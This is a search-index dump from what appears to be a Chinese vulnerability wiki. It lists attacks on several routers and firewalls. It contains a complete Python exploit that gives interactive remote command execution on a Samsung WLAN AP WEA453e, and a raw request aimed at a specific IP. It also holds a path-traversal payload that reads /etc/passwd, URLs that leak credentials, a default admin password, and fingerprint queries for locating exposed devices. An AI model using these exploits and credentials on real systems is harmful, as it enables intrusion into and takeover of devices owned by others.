AP WEA453e路由器 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 三星 WLAN AP WEA453e路由器 存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限。 ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 三星 WLAN AP WEA453e路由器 ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"Samsung WLAN AP\" ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 请求包如下 POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 三星 WLAN AP WEA453e路由器 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"root\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 目标 {} 存在漏洞, 响应为:\\n{}\\033[0m\".format(target_url, response.text)) while True: cmd = str(input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\")) POC_2(target_url, cmd) else: print(\"\\033[31m[x] 目标 {} 不存在默认管理员弱口令 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:{}| dd of=/tmp/a.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[36m{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E4%B8%89%E6%98%9F-wlan-ap-wea453e%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞 CNVD-2020-67110 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/"},{"categories":null,"content":"漏洞描述 中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/"},{"categories":null,"content":"漏洞影响 中国移动 禹路由 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/"},{"categories":null,"content":"网络测绘 title=\"互联世界 物联未来-登录\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问Url /cgi-bin/ExportSettings.sh 其中password为登录后台密码 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-exportsettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2020-67110/"},{"categories":null,"content":"中国移动 禹路由 simple-index.asp 越权访问漏洞 CNVD-2020-55983 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/"},{"categories":null,"content":"漏洞描述 中国移动 禹路由 simple-index.asp 存在越权访问漏洞，攻击者通过漏洞可以获取账号密码等敏感信息 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/"},{"categories":null,"content":"漏洞影响 中国移动 禹路由 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/"},{"categories":null,"content":"网络测绘 title=\"互联世界 物联未来-登录\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问Url /simple-index.asp 越过管理员验证获取Wifl账号密码等信息 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-simple-index.asp-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cnvd-2020-55983/"},{"categories":null,"content":"中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞, 攻击者通过漏洞可以读取服务器上的文件 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 中科网威 下一代防火墙控制系统 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"Get_Verify_Info(hex_md5(user_string).\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞存在于 download.php 任意点击后抓包，更改 toolname 参数 /download.php?\u0026class=vpn\u0026toolname=../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"中科网威 下一代防火墙控制系统 账号密码泄露漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 中科网威 下一代防火墙控制系统 存在账号密码泄露漏洞，攻击者通过前端获取密码的Md5后解密可获取完整密码登陆后台 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 中科网威 下一代防火墙控制系统 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"Get_Verify_Info(hex_md5(user_string).\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 F12查看前端发现 admin的md5加密密码 解密后登录后台 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"佑友防火墙 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 佑友防火墙 后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令 ","date":"0001-01-01","objectID":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 佑友防火墙 ","date":"0001-01-01","objectID":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"佑友防火墙\" ","date":"0001-01-01","objectID":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 默认账号密码为 User: admin Pass: hicomadmin 登录后台 系统管理 –\u003e 维护工具 –\u003e Ping ","date":"0001-01-01","objectID":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BD%91%E5%8F%8B%E9%98%B2%E7%81%AB%E5%A2%99-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"华夏创新 LotWan广域网优化系统 check_instance_state.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 华夏创新 LotWan广域网优化系统check_instance_state.php文件参数 ins存在命令拼接，导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 华夏创新 LotWan广域网优化系统 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"LotWan 广域网优化系统\" 